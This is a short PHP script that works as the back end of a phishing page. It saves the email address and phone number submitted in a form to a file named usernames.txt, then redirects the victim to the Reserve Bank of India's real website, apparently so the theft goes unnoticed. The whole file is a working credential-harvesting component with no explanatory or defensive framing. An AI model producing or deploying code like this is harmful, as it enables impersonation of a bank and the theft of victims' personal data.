<?php

file_put_contents("usernames.txt", "Email ID: " . $_POST['email'] . "\nNumber: " . $_POST['number'] . "\n\n", FILE_APPEND);
$url = "https://www.rbi.org.in"; 
header("Location: $url");
exit();
?>